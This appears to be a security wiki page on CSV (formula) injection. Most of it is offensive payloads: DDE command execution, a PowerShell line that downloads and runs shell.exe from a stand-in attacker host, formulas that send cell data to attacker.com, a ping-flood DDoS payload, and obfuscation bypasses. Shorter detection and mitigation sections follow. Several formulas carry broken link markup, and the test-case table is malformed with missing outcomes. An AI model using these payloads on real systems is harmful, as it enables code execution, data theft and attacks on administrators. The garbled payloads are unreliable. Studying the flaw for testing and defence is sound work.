---
title: CSV Injection
---

# CSV Injection

**CSV Injection**, also known as Formula Injection, is a security vulnerability that occurs when untrusted user input is embedded into exported CSV files without proper sanitization. When opened in spreadsheet programs like Microsoft Excel or LibreOffice Calc, cells starting with `=`, `+`, `-`, `@`, or similar characters are interpreted as formulas, potentially leading to command execution, data exfiltration, or other malicious actions.

## Understanding CSV Basics

- **CSV Format Overview**
    
    Comma-Separated Values (CSV) is a plain-text format for tabular data. Each line represents a row, and fields are separated by commas (or semicolons in some locales). Example:
    
    ```
    Name,Email,Notes
    John Doe,john@example.com,Regular user
    ```
    
- **Spreadsheet Interpretation**
    
    When opened in Excel/Calc:
    
    - Cells starting with `=`, `+`, , `@` (or full-width variants like `＝`, `＋`) are treated as formulas.
    - Functions like `HYPERLINK`, `cmd|`, `DDE`, `IMPORTDATA`, `WEBSERVICE` can execute actions.
    - Dynamic Data Exchange (DDE) enables OS command execution in older Excel versions.
- **Common Dangerous Functions**
    - `=HYPERLINK("<http://attacker.com?data="&A1,"Click>")` — Data exfiltration.
    - `=cmd|' /C calc'!A0` — Command execution (opens calculator).
    - `=IMPORTXML(CONCAT("<http://attacker.com?v=",JOIN(",",A1:A10>)),"//a")` — Advanced exfiltration.
- **Fuzzing Payloads**
    
    ```
    =cmd|' /C calc'!A0
    +cmd|' /C notepad'!A1
    -2+3+cmd|' /C calc'!A0
    @SUM(1+9)*cmd|' /C calc'!A0
    =HYPERLINK("<http://evil.com>","Click")
    ```
    

---

## CSV Injection Attack Surface

- **Export Features** (reports, user lists, transactions)
- **Admin Panels** (customer management, logs)
- **User-Generated Content** (profiles, comments, contact forms)
- **Log Downloads** (Azure Activity Logs, audit trails)
- **Data Import/Export Workflows**
- **Any field stored in DB and later exported to CSV**

---

## Exploiting CSV Injection

### 1. **Command Execution (DDE)**

Assume data is exported directly:

Payloads:

```
=cmd|' /C calc'!A0
=cmd|'/C powershell Invoke-WebRequest "<http://attacker.com/shell.exe>" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
@SUM(1+9)*cmd|' /C calc'!A0
```

Example: Inject into a "First Name" field → Export transactions → Open CSV → Calculator launches (or malware executes).

### 2. **Data Exfiltration via Hyperlink/Import**

```
=HYPERLINK("<http://attacker.com?data="&A1&","&B1,"Click> Here")
=WEBSERVICE(CONCAT("<http://attacker.com/log?v=>",A1))
=IMPORTDATA("<http://attacker.com/collect.csv>")
```

These send cell contents to the attacker's server when the file opens or the link is clicked.

### 3. **Blind/Advanced Formula Injection**

Test via response differences or file reads:

```
='file://etc/passwd'#$passwd.A1  (Linux file read example)
=IFERROR(cmd|'/c whoami'!A1,"")
```

### 4. **Denial of Service / Botnet Creation**

Inject payloads that make the victim's machine ping a target endlessly:

```
=cmd|'/C ping -t target.com -l 65500'!A1
```

Scaled across many victims → distributed DoS.

### 5. **Attribute / Data Manipulation**

Modify exported data appearance or embed tracking:

```
=10+20+cmd|' /C calc'!A0  (obfuscated)
```

**Example:**

Username field: `=cmd|' /C calc'!A0`

Exported CSV opens → payload executes on admin's machine.

### 6. **Escalating Impact**

CSV injection combined with social engineering can trick users into trusting exported files and executing malicious formulas or payloads.

### 7. **Blind CSV Injection Techniques**

- Boolean-based: Different spreadsheet behavior (error vs. success).
- Content-based: Check exported file for executed formulas.
- Time-based: Heavy formulas causing delays (rare).

---

## CSV Injection Bypasses & Obfuscation

- **Encoded Payloads:** `%3Dcmd%7C%27%2Fc%20calc%27%21A0`
- **Prefix Variations:** Tab (`\t=cmd...`), single quote (`'=cmd...`), space.
- **Nested/Combined Formulas:** `=IF(1=1,cmd|'/c calc'!A1,"")`
- **Locale-Specific:** Full-width characters (Japanese Excel).
- **Newline Injection:** `%0A=cmd|' /C calc'!A0`
- **Null/Control Chars:** Carriage return, line feed to split cells.

---

## Advance Attack Scenarios

### 1. **Nested Formula Abuse**

Force evaluation with `=IFERROR(IMPORTDATA("<http://attacker.com>"),"")` wrapped in benign math.

### 2. **Second-Order Injection**

Malicious payload is stored in the database during input submission and later triggered when the data is exported to an admin CSV file.

### 3. **Active Directory / Enterprise Exfil**

Inject malicious formulas into data sources or logs that are later exported as CSV, potentially exposing credentials or sensitive information when opened by administrators.

### 4. **Data Exfiltration via Attribute Expansion**

`=(JOIN(",",A1:Z100))` concatenated and sent via WEBSERVICE.

### 5. **User Harvesting / Enumeration**

Payloads that trigger different warnings based on data presence.

### 6. **Time-Based / Heavy Query Exploitation**

Complex nested formulas causing spreadsheet hangs or high CPU.

### 7. **CSV Injection in Password Reset / Logs**

Malicious payloads injected into audit logs or password reset records may execute when administrators export and open the CSV file.

### 8. **Null Byte / Truncation**

Rare, but combined with other evasions.

### 9. **Chained with Other Flaws**

CSV injection combined with weak session management can increase impact and potentially lead to persistent administrative compromise.

### 10. **Cross-Platform Exploitation**

Works in Excel, Calc, Google Sheets (limited); combine with macro-enabled exports.

---

## Detection Techniques

### Manual Detection Techniques

- **Special Character Injection Testing:** Inject formula payloads such as `=1+1`, `+cmd...`, or `-2+3+cmd...` and observe for unexpected execution or behavior.
- **Boolean-Based Testing:** Inject conditional formulas and compare spreadsheet behavior, warnings, or output differences.
- **Hyperlink / Import Testing:** Check if clicks lead to external sites.
- **Error-Based Detection:** Use malformed formulas to identify spreadsheet errors or formula parsing behavior
- **Time/Resource-Based Observation:**Check for delayed file opening, performance issues, or abnormal resource consumption.
- **Export Logic Testing:** Inject payloads, export the data, and verify behavior when the CSV file is opened in spreadsheet applications.

### Automated Detection Techniques

- **Proxy-Based Dynamic Scanning:** Use Burp Intruder with CSV payload lists on input fields → export → analyze.
- **Fuzzing with Payload Libraries:** GitHub payload lists (100+ entries) for Intruder.

**Automated Security Scanners**

- Burp Suite (Intruder + custom payloads)
- OWASP ZAP
- Nuclei templates for export checks
- Custom scripts to scan exported CSVs for leading `= + - @`

---

## Test Cases

| Scenario | Payload | Expected Outcome |
| --- | --- | --- |
| Command Execution | `=cmd | ' /C calc'!A0` |
| Data Exfiltration | `=HYPERLINK("<http://attacker.com?v="&A1,"Click>")` | Data sent to attacker when clicked |
| Obfuscated Exec | `@SUM(1+9)*cmd | ' /C calc'!A0` |
| File Read (Linux) | `='file://etc/passwd'#$passwd.A1` | Displays system file contents |
| Remote Download + Exec | `=cmd | '/C powershell IWR "[http://evil.com/shell.exe](http://evil.com/shell.exe)" -O "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1` |
| Breakout / New Cell | `","=cmd | ' /C calc'!A0` |

---

## Impact

- Execute arbitrary commands on victim's machine (RCE).
- Exfiltrate sensitive spreadsheet or system data.
- Turn victims into bots for DDoS.
- Phishing via malicious links in trusted exports.
- Compromise of admin/analyst workstations.
- Chain with other attacks for domain-wide impact.

---

## Tools

- **Burp Suite** (Intruder with CSV payload lists)
- **Custom Python scripts** for CSV sanitization testing
- **Metasploit** (for payload hosting in RCE chains)
- **Excel/LibreOffice** for manual verification

---

## Mitigation & Prevention

### Input Validation

- **Allowlist**: Alphanumeric + safe characters only.
- **Block**: `= + - @ \t \r \n` and full-width variants.

### Output Sanitization (Preferred)

- Prefix every field with `'` (single quote) inside quotes: `"'=dangerous"`
- Excel-resistant: Prefix with tab (`\t`) inside quoted field: `"\t=formula"`
- Wrap all fields in double quotes and escape internal quotes: `"field""with""quote"`

### Parameterized / Safe Export Libraries

- Use libraries that auto-escape (but verify—many do not by default).
- In Python (pandas/csv): Pre-process with `=`, `+`, etc. removal or prefixing.
- In PHP/Java/Node: Implement OWASP-recommended escaping.

### Least Privilege & Configuration

- Warn users before opening CSVs.
- Disable DDE in enterprise Excel policies.
- Rate-limit exports.
- Use non-spreadsheet formats (JSON, PDF) where possible.

### Secure Configurations

- Validate all exportable fields, not just direct inputs.
- Scan exported files server-side for formulas before serving.

---

## Good To Read:

HackerOne/Bugcrowd reports on CSV Injection in export features.

- https://hackerone.com/reports/1748961
- https://hackerone.com/reports/928280
- https://hackerone.com/reports/111192

---

## References:

- [https://owasp.org/www-community/attacks/CSV_Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [https://payatu.com/blog/csv-injection-basic-to-exploit/](https://payatu.com/blog/csv-injection-basic-to-exploit/)
- [https://www.veracode.com/blog/secure-development/data-extraction-command-execution-csv-injection/](https://www.veracode.com/blog/secure-development/data-extraction-command-execution-csv-injection/)
- [https://blog.cyberadvisors.com/technical-blog/blog/2020-4-23-csv-injection-whats-the-risk](https://blog.cyberadvisors.com/technical-blog/blog/2020-4-23-csv-injection-whats-the-risk)
- [https://github.com/payload-box/csv-injection-payload-list](https://github.com/payload-box/csv-injection-payload-list)
- [https://www.aptive.co.uk/blog/what-is-csv-injection/](https://www.aptive.co.uk/blog/what-is-csv-injection/)
- [https://infosecwriteups.com/formula-injection-exploiting-csv-functionality-cd3d8efd02ec](https://infosecwriteups.com/formula-injection-exploiting-csv-functionality-cd3d8efd02ec)